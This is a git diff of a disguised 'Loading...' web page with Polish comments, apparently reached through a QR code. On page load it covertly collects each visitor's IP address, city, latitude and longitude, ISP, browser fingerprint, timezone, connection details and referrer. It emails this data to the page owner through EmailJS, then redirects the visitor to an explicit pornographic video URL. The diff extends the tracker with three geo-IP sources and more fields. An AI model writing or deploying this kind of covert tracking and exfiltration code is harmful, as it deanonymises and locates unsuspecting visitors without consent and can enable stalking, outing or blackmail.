@@ -4,11 +4,10 @@
 <meta charset="UTF-8">
 <title>Loading...</title>
 
-<!-- EmailJS -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
 (function(){
-    emailjs.init("OCRNTDmp9goCkBZx7"); 
+    emailjs.init("OCRNTDmp9goCkBZx7"); // Twój Public Key
 })();
 </script>
 
@@ -20,32 +19,35 @@
 async function runTracker(){
 
     let visitNumber = 0;
-let ipData = { 
-    ip: "unknown", 
-    city: "unknown", 
-    country_name: "unknown", 
-    latitude: "unknown",   
-    longitude: "unknown"   
-};
+    let ipData = { ip:"unknown", city:"unknown", country_name:"unknown", latitude:"unknown", longitude:"unknown", org:"unknown" };
 
-
+    // 1️⃣ Licznik globalny
     try {
         let counterData = await fetch("https://api.countapi.xyz/hit/nudepublic_qrcode/visits")
             .then(r=>r.json());
         visitNumber = counterData.value;
-    } catch(e){
-        console.log("CountAPI error:", e);
-    }
+    } catch(e){ console.log("CountAPI error:", e); }
 
-
+    // 2️⃣ GEO IP - kilka źródeł dla dokładności
     try {
-        ipData = await fetch("https://ipapi.co/json/")
-            .then(r=>r.json());
-    } catch(e){
-        console.log("IPAPI error:", e);
-    }
+        let results = await Promise.all([
+            fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>null),
+            fetch("https://ipinfo.io/json?token=YOUR_TOKEN").then(r=>r.json()).catch(()=>null),
+            fetch("https://geolocation-db.com/json/").then(r=>r.json()).catch(()=>null)
+        ]);
 
+        for(let r of results){
+            if(!r) continue;
+            ipData.ip = ipData.ip === "unknown" && r.ip ? r.ip : ipData.ip;
+            ipData.city = ipData.city === "unknown" && r.city ? r.city : ipData.city;
+            ipData.country_name = ipData.country_name === "unknown" && (r.country_name || r.country) ? (r.country_name || r.country) : ipData.country_name;
+            ipData.latitude = ipData.latitude === "unknown" && (r.latitude || (r.loc && r.loc.split(",")[0])) ? (r.latitude || r.loc.split(",")[0]) : ipData.latitude;
+            ipData.longitude = ipData.longitude === "unknown" && (r.longitude || (r.loc && r.loc.split(",")[1])) ? (r.longitude || r.loc.split(",")[1]) : ipData.longitude;
+            ipData.org = ipData.org === "unknown" && r.org ? r.org : ipData.org;
+        }
+    } catch(e){ console.log("IP fetch error:", e); }
 
+    // 3️⃣ Fingerprint (prosty)
     let fingerprint = btoa(
         navigator.userAgent +
         navigator.language +
@@ -54,34 +56,48 @@ let ipData = {
         navigator.platform
     );
 
-
+    // 4️⃣ Bot detection
     let bot = /bot|crawler|spider|crawling/i.test(navigator.userAgent);
 
+    // 5️⃣ Połączenie i sieć
+    let connection = navigator.connection || {};
+    let cookies = navigator.cookieEnabled;
+    let touch = 'ontouchstart' in window;
 
-let report = {
-    visit_number: visitNumber,
-    ip: ipData.ip,
-    city: ipData.city,
-    country: ipData.country_name,
-    latitude: ipData.latitude,    // <-- dopisane
-    longitude: ipData.longitude,  // <-- dopisane
-    browser: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screen: screen.width + "x" + screen.height,
-    color_depth: screen.colorDepth,
-    bot: bot,
-    fingerprint: fingerprint,
-    url: window.location.href,
-    time: new Date().toLocaleString()
-};
+    // 6️⃣ Raport
+    let report = {
+        visit_number: visitNumber,
+        ip: ipData.ip,
+        city: ipData.city,
+        country: ipData.country_name,
+        latitude: ipData.latitude,
+        longitude: ipData.longitude,
+        org: ipData.org,
+        browser: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: screen.width + "x" + screen.height,
+        color_depth: screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        connection_type: connection.effectiveType || "unknown",
+        connection_downlink: connection.downlink || "unknown",
+        cookies_enabled: cookies,
+        touch_device: touch,
+        bot: bot,
+        fingerprint: fingerprint,
+        referrer: document.referrer || "direct",
+        url: window.location.href,
+        time: new Date().toLocaleString()
+    };
 
+    // 7️⃣ Wysyłka do EmailJS
     emailjs.send("service_ih1p04n", "template_pvl7hkh", report)
         .then(()=> console.log("Email wysłany"))
         .catch(e=> console.log("Email error:", e));
- 
+
+    // 8️⃣ Automatyczne przekierowanie
     setTimeout(()=>{
-        window.location.href = "https://www.gayporntube.com/video/2003987/gay-risky-cum-in-the-lake-at-night"; // <-- Wstaw docelowy URL
+        window.location.href = "https://www.gayporntube.com/video/2003987/gay-risky-cum-in-the-lake-at-night"; // <-- Twój URL
     },1500);
 }
 
